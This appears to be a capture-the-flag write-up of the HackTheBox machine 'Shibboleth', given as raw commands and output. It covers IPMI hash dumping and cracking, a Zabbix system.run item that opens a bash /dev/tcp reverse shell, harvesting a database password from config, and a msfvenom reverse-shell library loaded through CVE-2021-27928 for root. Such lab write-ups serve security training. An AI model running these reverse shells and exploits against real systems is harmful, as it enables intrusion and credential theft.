# scanning
* `TCP` Scan
TARGET=10.10.11.124 && nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap

PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://shibboleth.htb/
Service Info: Host: shibboleth.htb

10.10.11.124    shibboleth.htb

## subdomain scan
wfuzz -c -f subdomains.txt -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://shibboleth.htb/" -H "Host: FUZZ.shibboleth.htb" --hl 107

http://shibboleth.htb/
> dirsearch -u http://shibboleth.htb/ -x 302,403,401
[14:45:57] 200 -  218B  - /Readme.txt
```
Thanks for downloading this template!

Template Name: FlexStart
Template URL: https://bootstrapmade.com/flexstart-bootstrap-startup-template/
Author: BootstrapMade.com
License: https://bootstrapmade.com/license/
```
[14:46:12] 301 -  317B  - /assets  ->  http://shibboleth.htb/assets/
[14:46:12] 200 -    1KB - /assets/
[14:46:20] 200 -  499B  - /changelog.txt
```
Version: 1.2.0
  - Updated Bootstrap to version 5.0.0-beta3
  - Updated all outdated third party vendor libraries to their latest versions
  - Updated the PHP Email Form to V3.1

Version: 1.1.1
  - Updated Bootstrap to version 5.0.0-beta2
  - Updated all outdated third party vendor libraries to their latest versions

Version: 1.1.0
  - Added custom navbar links active on scroll functionality
  - Small fixes and imrovements in assets/js/main.js

Version: 1.0.0
  - Initial Release
```
[14:46:31] 301 -  316B  - /forms  ->  http://shibboleth.htb/forms/
[14:46:33] 200 -   58KB - /index.html

http://monitor.shibboleth.htb/
[14:48:03] 301 -  329B  - /js  ->  http://monitor.shibboleth.htb/js/
[14:48:42] 301 -  330B  - /app  ->  http://monitor.shibboleth.htb/app/
[14:48:43] 301 -  333B  - /assets  ->  http://monitor.shibboleth.htb/assets/
[14:48:44] 301 -  332B  - /audio  ->  http://monitor.shibboleth.htb/audio/
[14:48:46] 301 -  331B  - /conf  ->  http://monitor.shibboleth.htb/conf/
[14:48:56] 200 -   32KB - /favicon.ico
[14:48:56] 301 -  332B  - /fonts  ->  http://monitor.shibboleth.htb/fonts/
[14:48:57] 200 -    2KB - /image.php
[14:48:57] 301 -  334B  - /include  ->  http://monitor.shibboleth.htb/include/
[14:48:57] 500 -    0B  - /include/config.inc.php
[14:48:57] 200 -    4KB - /index.php
[14:48:57] 200 -    4KB - /index.php/login/
[14:49:05] 301 -  332B  - /local  ->  http://monitor.shibboleth.htb/local/
[14:49:06] 200 -    2KB - /maintenance.php
[14:49:06] 200 -    2KB - /map.php
[14:49:07] 301 -  334B  - /modules  ->  http://monitor.shibboleth.htb/modules/
[14:49:18] 200 -  974B  - /robots.txt
[14:49:18] 200 -    2KB - /setup.php

http://monitoring.shibboleth.htb/
[14:49:50] 301 -  335B  - /js  ->  http://monitoring.shibboleth.htb/js/
[14:50:24] 301 -  336B  - /app  ->  http://monitoring.shibboleth.htb/app/
[14:50:25] 301 -  339B  - /assets  ->  http://monitoring.shibboleth.htb/assets/
[14:50:25] 301 -  338B  - /audio  ->  http://monitoring.shibboleth.htb/audio/
[14:50:34] 301 -  337B  - /conf  ->  http://monitoring.shibboleth.htb/conf/
[14:50:37] 200 -   32KB - /favicon.ico
[14:50:37] 301 -  338B  - /fonts  ->  http://monitoring.shibboleth.htb/fonts/
[14:50:45] 200 -    2KB - /image.php
[14:50:45] 301 -  340B  - /include  ->  http://monitoring.shibboleth.htb/include/
[14:50:45] 500 -    0B  - /include/config.inc.php
[14:50:45] 200 -    4KB - /index.php
[14:50:45] 200 -    4KB - /index.php/login/
[14:50:46] 301 -  338B  - /local  ->  http://monitoring.shibboleth.htb/local/
[14:50:47] 200 -    2KB - /maintenance.php
[14:50:47] 200 -    2KB - /map.php
[14:50:48] 301 -  340B  - /modules  ->  http://monitoring.shibboleth.htb/modules/
[14:50:58] 200 -  974B  - /robots.txt
[14:50:59] 200 -    2KB - /setup.php

http://zabbix.shibboleth.htb/
[14:51:57] 301 -  327B  - /js  ->  http://zabbix.shibboleth.htb/js/
[14:52:34] 301 -  328B  - /app  ->  http://zabbix.shibboleth.htb/app/
[14:52:35] 301 -  331B  - /assets  ->  http://zabbix.shibboleth.htb/assets/
[14:52:35] 301 -  330B  - /audio  ->  http://zabbix.shibboleth.htb/audio/
[14:52:38] 301 -  329B  - /conf  ->  http://zabbix.shibboleth.htb/conf/
[14:52:47] 200 -   32KB - /favicon.ico
[14:52:47] 301 -  330B  - /fonts  ->  http://zabbix.shibboleth.htb/fonts/
[14:52:49] 200 -    2KB - /image.php
[14:52:49] 301 -  332B  - /include  ->  http://zabbix.shibboleth.htb/include/
[14:52:49] 500 -    0B  - /include/config.inc.php
[14:52:49] 200 -    4KB - /index.php
[14:52:49] 200 -    4KB - /index.php/login/
[14:52:57] 301 -  330B  - /local  ->  http://zabbix.shibboleth.htb/local/
[14:52:58] 200 -    2KB - /maintenance.php
[14:52:58] 200 -    2KB - /map.php
[14:52:58] 301 -  332B  - /modules  ->  http://zabbix.shibboleth.htb/modules/
[14:53:09] 200 -  974B  - /robots.txt
[14:53:10] 200 -    2KB - /setup.php

# futrther scanning
* https://book.hacktricks.xyz/pentesting/623-udp-ipmi
udp/623

msf6 auxiliary(scanner/ipmi/ipmi_version) > run

[*] Sending IPMI requests to 10.10.11.124->10.10.11.124 (1 hosts)
[+] 10.10.11.124:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

* https://book.hacktricks.xyz/pentesting/623-udp-ipmi
> use auxiliary/scanner/ipmi/ipmi_cipher_zero
[*] Sending IPMI requests to 10.10.11.124->10.10.11.124 (1 hosts)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

> apt-get install ipmitool
* Use Cipher 0 to dump a list of users
> ipmitool -I lanplus -C 0 -H 10.10.11.124 -U root -P root user list 


msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.10.11.124:623 - IPMI - Hash found: Administrator:f224439f0229000028cb38869a13a8a81ff3d1580ade5d0752a1416b4a4b24243f20717539d81562a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:1dec262710fd903f28c4b03ee84e8a1f10372ab0
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

f224439f0229000028cb38869a13a8a81ff3d1580ade5d0752a1416b4a4b24243f20717539d81562a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:1dec262710fd903f28c4b03ee84e8a1f10372ab0:ilovepumkinpie1

`Administrator:ilovepumkinpie1`

* login to zabbix

Zabbix 5.0.17

* add a host item and test the key value
> system.run[/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.x.x/4444 0>&1",nowait]
* receive reverse shell

# pe
> zabbix@shibboleth:/home/ipmi-svc$ su ipmi-svc
su ipmi-svc
Password: ilovepumkinpie1

ipmi-svc@shibboleth:~$ cat user.txt
cat user.txt

> grep -iR 'password' /etc/zabbix/ 2>/dev/null
```
/etc/zabbix/zabbix_server.conf.dpkg-dist:### Option: DBPassword
/etc/zabbix/zabbix_server.conf.dpkg-dist:#	Database password.
/etc/zabbix/zabbix_server.conf.dpkg-dist:#	Comment this line if no password is used.
/etc/zabbix/zabbix_server.conf.dpkg-dist:# DBPassword=
/etc/zabbix/zabbix_server.conf:### Option: DBPassword
/etc/zabbix/zabbix_server.conf:#	Database password.
/etc/zabbix/zabbix_server.conf:#	Comment this line if no password is used.
/etc/zabbix/zabbix_server.conf:DBPassword=bloooarskybluh

DBName=zabbix

### Option: DBSchema
#	Schema name. Used for PostgreSQL.
#
# Mandatory: no
# Default:
# DBSchema=

### Option: DBUser
#	Database user.
#
# Mandatory: no
# Default:
# DBUser=

DBUser=zabbix

### Option: DBPassword
#	Database password.
#	Comment this line if no password is used.
#
# Mandatory: no
# Default:
DBPassword=bloooarskybluh
```

> mysql -u zabbix -pbloooarskybluh -D zabbix

```
Admin:$2y$10$L9tjKByfruByB.BaTQJz/epcbDQta4uRM/KySxSZTwZkMGuKTPPT2
Administrator:$2y$10$FhkN5OCLQjs3d6C.KtQgdeCc485jKBWPW4igFVEgtIP3jneaN7GQe
```

* MariaDB 10.2, https://github.com/Al1ex/CVE-2021-27928
> msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.x.x LPORT=5555 -f elf-so -o exploit.so
> mysql -u zabbix -pbloooarskybluh -D zabbix
> SET GLOBAL wsrep_provider="/home/ipmi-svc/exploit.so";


> root@kali:~/workspace/htb-Shibboleth# nc -vnlp 5555
listening on [any] 5555 ...
connect to [10.10.x.x] from (UNKNOWN) [10.10.11.124] 44214
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
cat root.txt


# ref
https://zhuanlan.zhihu.com/p/441017466